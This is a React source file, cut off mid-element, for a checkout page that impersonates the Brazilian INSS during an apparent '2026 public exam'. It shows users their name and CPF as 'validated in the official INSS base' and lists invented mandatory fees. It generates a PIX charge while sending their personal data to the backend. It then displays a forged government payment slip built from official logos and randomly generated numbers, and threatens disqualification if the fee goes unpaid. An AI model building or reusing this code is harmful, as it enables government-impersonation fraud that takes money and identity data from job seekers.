import { useState, useEffect, useRef } from "react";
import { useLocation } from "wouter";
import { ExercitoHeader } from "@/components/ExercitoHeader";
import { ExercitoFooter } from "@/components/ExercitoFooter";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import {
  User,
  FileText,
  CreditCard,
  AlertTriangle,
  Shield,
  Calendar,
  CheckCircle,
  Copy,
  Check,
  X,
  Clock,
  Loader2,
} from "lucide-react";
import { useClarityEvents } from "@/hooks/use-clarity-events";
import { useToast } from "@/hooks/use-toast";
import { fireGtmPurchase } from "@/lib/gtm";
import { getSiteConfig } from "@/lib/siteConfig";
import { getExamDateISO } from "@/utils/examDate";

const FONT_AWESOME_5_URL = 'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css';
const LOGO_RECEITA_URL = 'https://servicos.receitafederal.gov.br/assets/images/receitaAzul.svg';

function getBreakdown(total: number) {
  const r1 = 52.45 / 147.24;
  const r2 = 46.15 / 147.24;
  const taxa = Math.round(total * r1 * 100) / 100;
  const emolumento = Math.round(total * r2 * 100) / 100;
  const custeio = Math.round((total - taxa - emolumento) * 100) / 100;
  return { taxa, emolumento, custeio };
}

function fmt(v: number) {
  return v.toFixed(2).replace(".", ",");
}

export default function ConfirmarDadosPage() {
  const [, setLocation] = useLocation();
  const [candidateFullName, setCandidateFullName] = useState("");
  const [candidateFirstName, setCandidateFirstName] = useState("");
  const [candidateCPF, setCandidateCPF] = useState("");
  const [ticketAmount, setTicketAmount] = useState<number>(() => {
    const saved = localStorage.getItem("confirmarDadosPixAmount");
    return saved ? parseFloat(saved) : 0;
  });
  const [isConfirming, setIsConfirming] = useState(false);
  const [showPixModal, setShowPixModal] = useState(false);
  const [pixData, setPixData] = useState<any>(null);
  const [isCopied, setIsCopied] = useState(false);
  const [isMonitoringPayment, setIsMonitoringPayment] = useState(false);
  const [paymentVerified, setPaymentVerified] = useState(false);
  const paymentCheckInterval = useRef<NodeJS.Timeout | null>(null);
  const { trackEvent } = useClarityEvents();
  const { toast } = useToast();

  // Boleto-style modal fields
  const [dataHoje, setDataHoje] = useState('');
  const [numeroDocumento, setNumeroDocumento] = useState('');
  const [nossoNumero, setNossoNumero] = useState('');
  const [guiaNumero, setGuiaNumero] = useState('');
  const [linhaDigitavel, setLinhaDigitavel] = useState('');
  const [copyButtonText, setCopyButtonText] = useState('Copiar Código PIX');
  const [copyButtonColor, setCopyButtonColor] = useState('#1351B4');
  const [boletoExamCity, setBoletoExamCity] = useState('');
  const [boletoPositionTitle, setBoletoPositionTitle] = useState('');
  const [boletoValidationCode, setBoletoValidationCode] = useState('');

  // PIX SVG Icon Component
  const PixIcon = ({ className }: { className?: string }) => (
    <svg
      className={className}
      viewBox="0 0 24 24"
      fill="currentColor"
      xmlns="http://www.w3.org/2000/svg"
    >
      <path d="M7.4 2.4L5.6 4.2l4.2 4.2 4.2-4.2-1.8-1.8L12 2.6 7.4 2.4zM2.4 7.4l1.8 1.8L8.4 5L6.6 3.2 2.4 7.4zM16.6 2.4L14.8 4.2l4.2 4.2 1.8-1.8L16.6 2.4zM21.6 7.4L19.8 9.2l-4.2-4.2 1.8-1.8L21.6 7.4zM7.4 16.6l1.8 1.8 4.2-4.2-1.8-1.8L7.4 16.6zM2.4 16.6l4.2 4.2 1.8-1.8-4.2-4.2L2.4 16.6zM16.6 21.6l1.8-1.8-4.2-4.2-1.8 1.8L16.6 21.6zM21.6 16.6l-4.2 4.2-1.8-1.8 4.2-4.2L21.6 16.6z" />
    </svg>
  );

  useEffect(() => {
    window.scrollTo(0, 0);

    // Check if user passed through medical confirmation
    const loginValidated = localStorage.getItem("loginValidated");
    if (!loginValidated) {
      setLocation("/login-pos-pagamento");
      return;
    }

    // Load candidate data from localStorage
    const userData =
      localStorage.getItem("userData") ||
      localStorage.getItem("userMedicalLogin");
    let storedFullName = "";
    let storedCPF = "";

    if (userData) {
      try {
        const parsedData = JSON.parse(userData);
        storedFullName = parsedData.name || parsedData.nomeCompleto || "";
        storedCPF = parsedData.cpf || "";

        if (!storedFullName || !storedCPF) {
          // Redirect back to login if essential data is missing
          setLocation("/login-pos-pagamento");
          return;
        }
      } catch (error) {
        console.error("Error parsing user data:", error);
        setLocation("/login-pos-pagamento");
        return;
      }
    } else {
      setLocation("/login-pos-pagamento");
      return;
    }

    setCandidateFullName(storedFullName);
    setCandidateCPF(storedCPF);

    // Extract and format first name
    if (storedFullName) {
      const firstName = storedFullName.split(" ")[0];
      const formattedFirstName =
        firstName.charAt(0).toUpperCase() + firstName.slice(1).toLowerCase();
      setCandidateFirstName(formattedFirstName);
    }

    // Fetch ticket amount if not already cached
    if (!localStorage.getItem("confirmarDadosPixAmount")) {
      const parsedForGender = JSON.parse(userData!);
      const rawGenero =
        parsedForGender?.gender ||
        parsedForGender?.genero ||
        parsedForGender?.sexo ||
        parsedForGender?.autoFilledData?.sexo ||
        "";
      fetch(
        `/api/valor-dinamico?tipo=medica&genero=${encodeURIComponent(rawGenero)}`,
      )
        .then((r) => r.json())
        .then((data) => {
          const valor = data.success ? data.valor : 68.92;
          localStorage.setItem("confirmarDadosPixAmount", valor.toString());
          setTicketAmount(valor);
        })
        .catch(() => {
          localStorage.setItem("confirmarDadosPixAmount", "68.92");
          setTicketAmount(68.92);
        });
    }

    trackEvent("data_confirmation_page_accessed", {
      page: "confirmar_dados",
      candidate_name: storedFullName,
      timestamp: new Date().toISOString(),
    });

    // Facebook Pixel — InitiateCheckout (amount loaded async, deferred to handler)
  }, []);

  // Fire GTM event once ticketAmount is resolved
  useEffect(() => {
    if (ticketAmount <= 0) return;
    if ((window as any).dataLayer) {
      (window as any).dataLayer.push({
        event: "initiate_checkout",
        value: ticketAmount,
        currency: "BRL",
      });
    }
  }, [ticketAmount]);

  // Payment monitoring function
  const startPaymentMonitoring = (transactionId: string) => {
    setIsMonitoringPayment(true);

    // Clear any existing interval
    if (paymentCheckInterval.current) {
      clearInterval(paymentCheckInterval.current);
    }

    // Start checking payment status every 1 second
    paymentCheckInterval.current = setInterval(async () => {
      try {
        const response = await fetch(
          `/api/verificar-status-pagamento/${transactionId}`,
          {
            method: "GET",
            headers: {
              "Content-Type": "application/json",
            },
          },
        );

        const result = await response.json();

        const currentStatus = result.data?.status?.toLowerCase();
        if (
          result.success &&
          (currentStatus === "paid" ||
            currentStatus === "completed" ||
            currentStatus === "approved")
        ) {
          // Payment confirmed!
          setPaymentVerified(true);
          setIsMonitoringPayment(false);

          // Clear the interval
          if (paymentCheckInterval.current) {
            clearInterval(paymentCheckInterval.current);
          }

          // GTM Purchase — dedup guard por transactionId
          fireGtmPurchase({ transactionId, value: ticketAmount });

          toast({
            title: "Pagamento Confirmado!",
            description: "Redirecionando para próxima etapa...",
          });

          setLocation("/e-social/loading");
        }
      } catch (error) {
        console.error("Error checking payment status:", error);
      }
    }, 1000); // Check every 1 second
  };

  // Cleanup interval on component unmount
  useEffect(() => {
    return () => {
      if (paymentCheckInterval.current) {
        clearInterval(paymentCheckInterval.current);
      }
    };
  }, []);

  // Populate boleto random fields on mount
  useEffect(() => {
    const now = new Date();
    const d = String(now.getDate()).padStart(2, '0');
    const m = String(now.getMonth() + 1).padStart(2, '0');
    const y = now.getFullYear();
    setDataHoje(`${d}/${m}/${y}`);

    const r3 = () => Math.floor(Math.random() * 999).toString().padStart(3, '0');
    const r8 = () => Math.floor(Math.random() * 99999999).toString().padStart(8, '0');
    setNumeroDocumento(`${r3()}/${r8()}-8`);
    setNossoNumero(`${r3()}/${r8()}-4`);

    const g1 = Math.floor(Math.random() * 9999999).toString().padStart(7, '0');
    const g2 = Math.floor(Math.random() * 99).toString().padStart(2, '0');
    setGuiaNumero(`${g1}-${g2}/${g2}`);

    const p = () => Math.floor(Math.random() * 99999).toString().padStart(5, '0');
    const p4 = Math.floor(Math.random() * 999999).toString().padStart(6, '0');
    const p6 = Math.floor(Math.random() * 999999).toString().padStart(6, '0');
    setLinhaDigitavel(`00190.${p()} ${p()}.${p()} ${p4}.${p()} 1 ${p6}14794`);

    try {
      const appData = JSON.parse(localStorage.getItem('applicationData') || '{}');
      setBoletoPositionTitle(appData.positionTitle || 'Analista do Seguro Social');
      const city = appData.selectedJunta?.name || appData.juntasData?.municipio || appData.juntasData?.cidade || appData.examLocationName || '';
      setBoletoExamCity(city);
    } catch {}

    setBoletoValidationCode(localStorage.getItem('validationCode') || '');
  }, []);

  // Load Font Awesome 5 when the PIX modal is open
  useEffect(() => {
    if (!showPixModal) {
      document.getElementById('font-awesome-5-confirmar')?.remove();
      return;
    }
    if (!document.getElementById('font-awesome-5-confirmar')) {
      const fa5Link = document.createElement('link');
      fa5Link.rel = 'stylesheet';
      fa5Link.href = FONT_AWESOME_5_URL;
      fa5Link.id = 'font-awesome-5-confirmar';
      document.head.appendChild(fa5Link);
    }
    return () => {
      document.getElementById('font-awesome-5-confirmar')?.remove();
    };
  }, [showPixModal]);

  const handleConfirmPayment = async () => {
    setIsConfirming(true);

    trackEvent("payment_confirmation_initiated", {
      candidate_name: candidateFullName,
      candidate_cpf: candidateCPF.replace(
        /(\d{3})(\d{3})(\d{3})(\d{2})/,
        "$1.***.***-$4",
      ),
      total_amount: ticketAmount.toString(),
      page: "confirmar_dados",
      timestamp: new Date().toISOString(),
    });

    try {
      // Get user data from localStorage
      const userData =
        localStorage.getItem("userData") ||
        localStorage.getItem("userMedicalLogin");
      let parsedUserData: any = {};

      if (userData) {
        parsedUserData = JSON.parse(userData);
      }

      const cleanCPF = candidateCPF.replace(/\D/g, "");
      const emailResolved = parsedUserData?.email || "candidato@exemplo.com";
      const phoneResolved =
        parsedUserData?.telefone ||
        parsedUserData?.phone ||
        localStorage.getItem("phoneuser") ||
        "11999999999";
      const locationStr = `${parsedUserData?.cidade || "Cidade"} - ${parsedUserData?.uf || "UF"}`;

      const pixPayload = {
        amount: ticketAmount,
        description: `${import.meta.env.VITE_PRODUCT_NAME || 'PM'}2`,
        customer: {
          name: candidateFullName,
          email: emailResolved,
          cpf: cleanCPF,
          phone: phoneResolved,
        },
        nome: candidateFullName,
        cpf: cleanCPF,
        email: emailResolved,
        telefone: phoneResolved,
        valor: Math.round(ticketAmount * 100),
        applicationData: parsedUserData,
        inscricaoData: {
          vaga: {
            id: "concurso-inss-2026",
            title: "Taxa de Confirmação — Concurso Público INSS 2026",
            company: "INSS",
            location: locationStr,
            area: "Seguro Social",
            carga_horaria: "40 horas semanais",
            requirements: "Conforme edital",
          },
          localProva: {
            name: "Local a definir",
            address: "Endereço será informado",
            type: "inss",
            distance: null,
          },
          dataProva: (() => {
            try {
              return (
                JSON.parse(localStorage.getItem("applicationData") || "{}")
                  ?.examDate || getExamDateISO()
              );
            } catch {
              return getExamDateISO();
            }
          })(),
          horaProva: "14:00",
        },
        userData: parsedUserData,
        pessoalData: null,
        utm_params: (() => {
          const safeObj = (raw: string | null): Record<string, unknown> => {
            try {
              const parsed = JSON.parse(raw || "{}");
              return parsed !== null &&
                typeof parsed === "object" &&
                !Array.isArray(parsed)
                ? (parsed as Record<string, unknown>)
                : {};
            } catch {
              return {};
            }
          };
          const base = safeObj(localStorage.getItem("utm_params"));
          const ud = safeObj(localStorage.getItem("userData"));
          const pd = safeObj(localStorage.getItem("pessoalData"));
          const udAuto =
            ud.autoFilledData instanceof Object &&
            !Array.isArray(ud.autoFilledData)
              ? (ud.autoFilledData as Record<string, unknown>)
              : {};
          const SITE = getSiteConfig();
          const str = (v: unknown): string => (typeof v === "string" ? v : "");
          return {
            ...base,
            rt_gender:
              str(ud.gender) ||
              str(ud.genero) ||
              str(ud.sexo) ||
              str(udAuto.sexo) ||
              str(pd.sexo),
            rt_birthday:
              str(ud.dataNascimento) ||
              str(ud.birthday) ||
              str(pd.dataNascimento),
            rt_phone: str(ud.telefone),
            rt_zipcode: str(ud.cep),
            red_url: SITE.redUrl ?? "",
          };
        })(),
      };

      const response = await fetch("/api/gerar-pix", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(pixPayload),
      });

      const result = await response.json();

      if (result.success) {
        // Store PIX transaction data
        const pixTransaction = {
          id: result.data.id,
          qrCode: result.data.qrCode,
          pixCode: result.data.pixCode,
          amount: result.data.amount / 100,
          status: result.data.status,
          createdAt: result.data.createdAt,
        };

        localStorage.setItem("pixTransaction", JSON.stringify(pixTransaction));
        localStorage.setItem("paymentAmount", ticketAmount.toString());
        localStorage.setItem("paymentDate", new Date().toISOString());

        // Set PIX data and show modal
        setPixData(pixTransaction);
        setShowPixModal(true);

        // SMS agendamento — fire-and-forget, não bloqueia o fluxo
        const smsFirstName = (
          parsedUserData?.name ||
          parsedUserData?.nomeCompleto ||
          ""
        ).split(" ")[0];
        const smsPhone =
          parsedUserData?.telefone ||
          parsedUserData?.phone ||
          localStorage.getItem("phoneuser") ||
          "";
        if (smsPhone && smsFirstName) {
          fetch("/api/sms-agendamento", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              phoneNumber: smsPhone,
              firstName: smsFirstName,
            }),
          }).catch(() => {});
        }

        // GTM — AddPaymentInfo
        if ((window as any).dataLayer) {
          (window as any).dataLayer.push({
            event: "add_payment_info",
            value: ticketAmount,
            currency: "BRL",
          });
        }

        // Start payment monitoring
        startPaymentMonitoring(pixTransaction.id);
      } else {
        console.error("Error generating PIX:", result.error);
        toast({
          title: "Erro ao gerar PIX",
          description: "Tente novamente em alguns instantes.",
          variant: "destructive",
        });
      }
    } catch (error) {
      console.error("Error during PIX generation:", error);
      toast({
        title: "Erro interno",
        description: "Tente novamente em alguns instantes.",
        variant: "destructive",
      });
    } finally {
      setIsConfirming(false);
    }
  };

  const formatCPF = (cpfValue: string) => {
    const clean = cpfValue.replace(/\D/g, '');
    if (clean.length === 11) return clean.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
    return cpfValue;
  };

  const handleCopyPixCode = async () => {
    if (pixData?.pixCode) {
      try {
        await navigator.clipboard.writeText(pixData.pixCode);
        setIsCopied(true);
        setCopyButtonText('Copiado!');
        setCopyButtonColor('#059669');
        if (pixData?.id) localStorage.setItem(`pix_copiado_${pixData.id}`, 'true');
        toast({
          title: "Código PIX copiado!",
          description:
            "Cole no seu aplicativo bancário para efetuar o pagamento.",
        });
        setTimeout(() => {
          setIsCopied(false);
          setCopyButtonText('Copiar Código PIX');
          setCopyButtonColor('#1351B4');
        }, 3000);
      } catch (error) {
        console.error("Error copying to clipboard:", error);
        toast({
          title: "Erro ao copiar",
          description: "Tente copiar manualmente o código PIX.",
          variant: "destructive",
        });
      }
    }
  };

  const handleCloseModal = () => {
    setShowPixModal(false);
    window.scrollTo({ top: 0, behavior: "smooth" });
    setLocation("/agendamento-medico");
  };

  return (
    <div
      className="min-h-screen bg-white flex flex-col"
      style={{ fontFamily: "Rawline, Arial, sans-serif" }}
    >
      <ExercitoHeader />

      <main className="flex-1 container mx-auto max-w-4xl px-4 py-6">
        {/* Breadcrumb */}
        <nav className="text-sm text-gray-500 mb-6">
          <span>Concurso Público INSS 2026</span>
          <span className="mx-1 text-gray-400">›</span>
          <span>Confirmação Médica</span>
          <span className="mx-1 text-gray-400">›</span>
          <span className="text-gray-900 font-medium">Confirmar Dados</span>
        </nav>

        {/* Header */}
        <header className="mb-8">
          <h1 className="text-xl font-semibold text-gray-900 mb-2 leading-tight">
            {candidateFirstName
              ? `${candidateFirstName}, confirme seus dados`
              : "Confirmação de Dados e Pagamento"}
          </h1>
          <p className="text-sm text-gray-500 leading-relaxed mb-0">
            Revise seus dados e confirme o pagamento para finalizar sua
            inscrição no Concurso Público INSS 2026.
          </p>
        </header>

        {/* Dados Pessoais */}
        <section className="mb-8">
          <Card>
            <CardContent className="p-6">
              <div className="flex items-center mb-4">
                <User className="w-4 h-4 text-gray-500 mr-2" />
                <h2 className="text-base font-semibold text-gray-700">
                  Dados Pessoais
                </h2>
              </div>

              <div className="grid md:grid-cols-2 gap-4">
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-1">
                    Nome Completo
                  </label>
                  <div className="p-3 bg-gray-50 rounded border">
                    <span className="font-medium text-gray-900">
                      {candidateFullName}
                    </span>
                  </div>
                </div>

                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-1">
                    CPF
                  </label>
                  <div className="p-3 bg-gray-50 rounded border">
                    <span className="font-medium text-gray-900">
                      {candidateCPF.replace(
                        /(\d{3})(\d{3})(\d{3})(\d{2})/,
                        "$1.$2.$3-$4",
                      )}
                    </span>
                  </div>
                </div>
              </div>

              <div className="mt-4 flex items-center gap-2 p-3 bg-green-50 border border-green-100 rounded-lg">
                <CheckCircle className="w-4 h-4 text-green-600 flex-shrink-0" />
                <p className="text-xs text-green-700 font-medium">
                  Dados validados e confirmados na base oficial do INSS
                </p>
              </div>
            </CardContent>
          </Card>
        </section>

        {/* Taxas e Pagamento */}
        <section className="mb-8">
          <Card>
            <CardContent className="p-6">
              <div className="flex items-center mb-4">
                <CreditCard className="w-4 h-4 text-gray-500 mr-2" />
                <h2 className="text-base font-semibold text-gray-700">
                  Resumo das Taxas
                </h2>
              </div>

              <p className="text-xs font-semibold uppercase tracking-wide text-gray-400 mb-3">
                Taxas Obrigatórias do Processo Seletivo
              </p>
              {ticketAmount > 0 ? (
                (() => {
                  const bd = getBreakdown(ticketAmount);
                  return (
                    <div className="divide-y divide-gray-100 text-sm mb-3">
                      <div className="flex justify-between py-1.5">
                        <span className="text-gray-600">
                          Taxa de Agendamento e Confirmação Médica
                        </span>
                        <span className="font-medium text-gray-900">
                          R$ {fmt(bd.taxa)}
                        </span>
                      </div>
                      <div className="flex justify-between py-1.5">
                        <span className="text-gray-600">
                          Taxa de Processamento Documental — INSS
                        </span>
                        <span className="font-medium text-gray-900">
                          R$ {fmt(bd.emolumento)}
                        </span>
                      </div>
                      <div className="flex justify-between py-1.5">
                        <span className="text-gray-600">
                          Taxa de Finalização de Cadastro no Portal
                        </span>
                        <span className="font-medium text-gray-900">
                          R$ {fmt(bd.custeio)}
                        </span>
                      </div>
                      <div className="flex justify-between py-2 font-bold text-sm">
                        <span>VALOR TOTAL</span>
                        <span className="text-red-600">
                          R$ {fmt(ticketAmount)}
                        </span>
                      </div>
                    </div>
                  );
                })()
              ) : (
                <div className="text-sm text-gray-400 py-2 mb-3">
                  Carregando taxas...
                </div>
              )}
              <p className="text-xs text-gray-400">
                Base Legal: Taxas estabelecidas conforme edital do Concurso
                Público INSS 2026
              </p>
            </CardContent>
          </Card>
        </section>

        {/* Informações Importantes */}
        <section className="mb-8">
          <Card className="border-gray-200">
            <CardContent className="p-6">
              <h2 className="text-base font-semibold text-gray-700 mb-4 flex items-center">
                <AlertTriangle className="w-4 h-4 text-gray-500 mr-2" />
                Informações Importantes
              </h2>

              <div className="space-y-4 text-sm text-gray-700">
                <div className="flex items-start">
                  <div className="w-1.5 h-1.5 rounded-full bg-[#0063AF] mr-3 mt-2 flex-shrink-0"></div>
                  <p>
                    Pagamento obrigatório para participação no processo seletivo
                  </p>
                </div>

                <div className="flex items-start">
                  <div className="w-1.5 h-1.5 rounded-full bg-[#0063AF] mr-3 mt-2 flex-shrink-0"></div>
                  <p>
                    Validação automática no Portal do INSS após confirmação
                    do pagamento
                  </p>
                </div>

                <div className="flex items-start">
                  <div className="w-1.5 h-1.5 rounded-full bg-[#0063AF] mr-3 mt-2 flex-shrink-0"></div>
                  <p>
                    Não pagamento resulta em desclassificação automática do
                    Concurso Público INSS 2026
                  </p>
                </div>

                <div className="flex items-start">
                  <div className="w-1.5 h-1.5 rounded-full bg-[#0063AF] mr-3 mt-2 flex-shrink-0"></div>
                  <p>Prova de seleção agendada após pagamento confirmado</p>
                </div>
              </div>
            </CardContent>
          </Card>
        </section>

        {/* Botão de Confirmação */}
        <div className="mb-8">
          <Button
            onClick={handleConfirmPayment}
            disabled={isConfirming}
            className="w-full max-w-sm mx-auto flex items-center justify-center gap-2 py-3.5 text-sm font-semibold text-white rounded-lg transition-all duration-200"
            style={{ backgroundColor: "#0063AF" }}
            onMouseEnter={(e) => {
              if (!isConfirming)
                e.currentTarget.style.backgroundColor = "#004D8C";
            }}
            onMouseLeave={(e) => {
              if (!isConfirming)
                e.currentTarget.style.backgroundColor = "#0063AF";
            }}
          >
            {isConfirming ? (
              <>
                <Loader2 className="w-4 h-4 animate-spin" />
                Gerando PIX...
              </>
            ) : (
              "Gerar PIX"
            )}
          </Button>

          <p className="text-xs text-gray-400 mt-3 text-center max-w-sm mx-auto">
            Ao confirmar, você autoriza o pagamento e finaliza sua inscrição.
            Dados validados no sistema oficial — Portal do INSS.
          </p>
        </div>

        {/* Informações de Segurança */}
        <div className="flex items-center justify-center gap-3 py-4 border-t border-gray-100 text-xs text-gray-400 mb-4">
          <div className="flex items-center gap-1">
            <Shield className="w-3.5 h-3.5" />
            <span>Conexão segura</span>
          </div>
          <span>·</span>
          <span>Criptografia SSL</span>
          <span>·</span>
          <span>LGPD</span>
        </div>
      </main>

      {/* PIX Payment Modal — Guia de Arrecadação INSS */}
      <Dialog open={showPixModal} onOpenChange={setShowPixModal}>
        <DialogContent className="w-screen h-screen max-w-none max-h-none m-0 rounded-none p-0 [&>button]:hidden overflow-y-auto bg-white">
          <div style={{ fontFamily: 'Arial, sans-serif', backgroundColor: '#222', minHeight: '100vh' }}>

            {/* ── Recibo superior ── */}
            <div style={{ maxWidth: '1200px', margin: '0 auto', backgroundColor: 'white' }}>

              {/* Header azul */}
              <div style={{ backgroundColor: '#1351B4', padding: 0, position: 'relative' }}>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', padding: '0 12px' }}>
                  {/* Brasão + nome do órgão */}
                  <div style={{
                    backgroundColor: 'white',
                    borderBottomRightRadius: '20px',
                    borderBottomLeftRadius: '20px',
                    display: 'inline-block',
                    padding: '14px 14px 16px 14px',
                    boxShadow: '0 4px 12px 0 rgba(0,0,0,0.08)',
                    marginTop: '14px',
                    marginBottom: '-8px',
                    minWidth: '160px',
                    maxWidth: '240px',
                    position: 'relative',
                    borderBottom: '5px solid #071D41',
                    zIndex: 10,
                  }}>
                    <div style={{ display: 'flex', alignItems: 'center' }}>
                      <img
                        alt="Brasão da República"
                        src="https://www.gov.br/planalto/pt-br/conheca-a-presidencia/biblioteca-da-pr/simbolos-nacionais/brasao-da-republica/brasaooficialcolorido.png"
                        style={{ width: '34px', height: '34px', marginRight: '8px', flexShrink: 0, objectFit: 'contain' }}
                      />
                      <div>
                        <div style={{ fontWeight: 'bold', fontSize: '10px', color: '#333', lineHeight: 1.3 }}>
                          Instituto Nacional do Seguro Social
                        </div>
                        <div style={{ fontSize: '9px', color: '#333', lineHeight: 1.3 }}>
                          Ministério da Previdência Social
                        </div>
                      </div>
                    </div>
                  </div>
                  {/* Logo INSS */}
                  <div style={{ marginTop: '6px', flexShrink: 0 }}>
                    <img
                      alt="Receita Federal"
                      src={LOGO_RECEITA_URL}
                      style={{ width: '60px', height: '50px', objectFit: 'contain', background: 'white', borderRadius: '10px', boxShadow: '0 2px 8px 0 rgba(0,0,0,0.08)', padding: '4px' }}
                    />
                  </div>
                </div>
              </div>

              {/* Dados do recibo */}
              <div style={{ padding: '12px 16px' }}>
                {/* Beneficiário */}
                <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '10px', flexWrap: 'wrap', gap: '8px' }}>
                  <div>
                    <div style={{ color: '#777', fontSize: '10px', marginBottom: '2px' }}>Endereço do Beneficiário</div>
                    <div style={{ fontSize: '12px', color: '#000' }}>Esplanada dos Ministérios, Bloco F / Brasília</div>
                  </div>
                  <div style={{ display: 'flex', gap: '16px' }}>
                    <div style={{ textAlign: 'right' }}>
                      <div style={{ color: '#777', fontSize: '10px' }}>UF</div>
                      <div style={{ fontSize: '12px' }}>DF</div>
                    </div>
                    <div style={{ textAlign: 'right' }}>
                      <div style={{ color: '#777', fontSize: '10px' }}>CEP</div>
                      <div style={{ fontSize: '12px' }}>70059-900</div>
                    </div>
                  </div>
                </div>

                {/* Pagador */}
                <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '10px', flexWrap: 'wrap', gap: '8px' }}>
                  <div>
                    <div style={{ color: '#777', fontSize: '10px', marginBottom: '2px' }}>Pagador</div>
                    <div style={{ fontSize: '12px', color: '#000', fontWeight: 'bold' }}>{candidateFullName}</div>
                  </div>
                  <div style={{ textAlign: 'right' }}>
                    <div style={{ color: '#777', fontSize: '10px', marginBottom: '2px' }}>CPF</div>
                    <div style={{ fontSize: '12px', color: '#000' }}>{formatCPF(candidateCPF)}</div>
                  </div>
                </div>

                {/* Instruções */}
                <div style={{ marginBottom: '10px' }}>
                  <div style={{ color: '#777', fontSize: '10px', marginBottom: '2px' }}>Instruções</div>
                  <div style={{ fontSize: '12px', marginTop: '6px' }}>
                    <div style={{ fontWeight: 'bold', color: '#991B1B' }}>NÃO RECEBER APÓS VENCIMENTO</div>
                    <div>Pagamento das Taxas de Confirmação Médica e Processamento Documental — Concurso Público INSS 2026, conforme edital</div>
                    <div>Protocolo: {boletoValidationCode || guiaNumero}</div>
                  </div>
                </div>

                {/* Datas e números */}
                <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1.5fr 0.5fr 0.5fr 0.5fr', gap: '6px', marginTop: '12px', fontSize: '10px' }}>
                  <div>
                    <div style={{ color: '#777' }}>Data Documento</div>
                    <div>{dataHoje}</div>
                  </div>
                  <div>
                    <div style={{ color: '#777' }}>Dt. Processamento</div>
                    <div>{dataHoje}</div>
                  </div>
                  <div>
                    <div style={{ color: '#777' }}>Num. Documento</div>
                    <div>{numeroDocumento}</div>
                  </div>
                  <div>
                    <div style={{ color: '#777' }}>Aceite</div>
                    <div>S</div>
                  </div>
                  <div>
                    <div style={{ color: '#777' }}>Código</div>
                    <div>0190</div>
                  </div>
                  <div>
                    <div style={{ color: '#777' }}>Espécie</div>
                    <div>R$</div>
                  </div>
                </div>

                {/* Cargo, nosso número, valor, vencimento */}
                <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1fr 1fr', gap: '6px', marginTop: '12px', fontSize: '10px' }}>
                  <div>
                    <div style={{ color: '#777' }}>Cargo / Edital</div>
                    <div>{boletoPositionTitle || 'Analista do Seguro Social'}</div>
                  </div>
                  <div>
                    <div style={{ color: '#777' }}>Nosso Número</div>
                    <div>{nossoNumero}</div>
                  </div>
                  <div style={{ textAlign: 'right' }}>
                    <div style={{ color: '#777' }}>Valor do Documento</div>
                    <div style={{ fontSize: '16px', fontWeight: 'bold' }}>
                      R$ {ticketAmount > 0 ? ticketAmount.toFixed(2) : pixData?.amount ? parseFloat(pixData.amount).toFixed(2) : '—'}
                    </div>
                  </div>
                  <div style={{ textAlign: 'right' }}>
                    <div style={{ color: '#777' }}>Vencimento</div>
                    <div style={{ fontSize: '16px', fontWeight: 'bold', color: '#991B1B' }}>{dataHoje}</div>
                  </div>
                </div>

                {/* Rodapé do recibo */}
                <div style={{ marginTop: '20px', fontSize: '10px', color: '#555' }}>
                  <div>Central de Atendimento INSS: 135 (informações, reclamações e sugestões)</div>
                  <div>Portal: gov.br/inss</div>
                  <div style={{ textAlign: 'right', color: '#888', marginTop: '10px' }}>Autenticação Mecânica — Recibo do Pagador</div>
                </div>
              </div>
            </div>

            {/* ── Seção de pagamento PIX ── */}
            <div style={{ maxWidth: '1200px', margin: '8px auto 0 auto', backgroundColor: 'white', borderTop: '2px dashed #999' }}>

              {/* Cabeçalho do boleto com linha digitável */}
              <div className="flex border-b border-black">
                <div
                  className="flex items-center justify-center w-[80px] md:w-[110px] h-[50px] md:h-[70px] border-r border-black overflow-hidden"
                  style={{ backgroundColor: '#1351B4' }}
                >
                  <img
                    alt="Receita Federal"
                    src={LOGO_RECEITA_URL}
                    style={{ objectFit: 'contain', width: '50px', height: '35px', filter: 'brightness(0) invert(1)' }}
                  />
                </div>
                <div className="flex items-center justify-center w-[60px] md:w-[90px] h-[50px] md:h-[70px] border-r border-black">
                  <span className="text-xl md:text-3xl font-bold" style={{ letterSpacing: '-0.5px' }}>001-9</span>
                </div>
                <div className="flex-1 flex items-center px-2 md:px-4 h-[50px] md:h-[70px] justify-end">
                  <span className="text-[7px] md:text-lg font-bold tracking-wider text-right">{linhaDigitavel}</span>
                </div>
              </div>

              <div className="flex border-b border-black">
                <div className="w-[75%] border-r border-black p-1 md:p-2">
                  <div className="text-[8px] md:text-xs leading-3">Local de Pagamento</div>
                  <div className="font-bold text-[10px] md:text-base">PAGÁVEL VIA PIX ATÉ O VENCIMENTO</div>
                </div>
                <div className="w-[25%] p-1 md:p-2">
                  <div className="text-[8px] md:text-xs leading-3">Vencimento</div>
                  <div className="font-bold text-[10px] md:text-base text-center">{dataHoje}</div>
                </div>
              </div>

              {/* QR Code + código copia e cola */}
              <div style={{ padding: '16px' }}>
                <div style={{ textAlign: 'center', marginBottom: '16px' }}>
                  <h3 style={{ fontSize: '16px', fontWeight: 'bold', color: '#1351B4', marginBottom: '8px' }}>
                    PAGAMENTO VIA PIX
                  </h3>
                  <p style={{ fontSize: '12px', color: '#666' }}>Escaneie o QR Code ou copie o código PIX</p>
                </div>

                <div style={{ display: 'flex', justifyContent: 'center', marginBottom: '16px' }}>
                  <div style={{ background: 'white', padding: '12px', border: '1px solid #ddd' }}>
                    {pixData?.pixCode ? (
                      <img
                        src={`https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=${encodeURIComponent(pixData.pixCode)}`}
                        alt="QR Code PIX"
                        style={{ width: '160px', height: '160px' }}
                        onError={(e) => {
                          if (pixData?.qrCode) {
